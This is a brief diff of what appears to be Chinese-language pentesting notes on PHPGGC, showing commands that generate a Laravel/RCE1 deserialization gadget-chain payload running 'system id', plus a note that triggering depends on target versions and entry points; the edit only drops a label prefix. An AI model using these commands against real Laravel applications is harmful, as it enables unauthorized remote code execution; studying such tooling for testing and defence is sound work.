@@ -18,4 +18,4 @@ phpggc -b Laravel/RCE1 system id
 phpggc -u Laravel/RCE1 system id
 ```
 
-小记录：PHPGGC 只负责生成 payload。真正能否触发取决于目标依赖版本、反序列化入口和链条可达性。
+PHPGGC 只负责生成 payload。真正能否触发取决于目标依赖版本、反序列化入口和链条可达性。
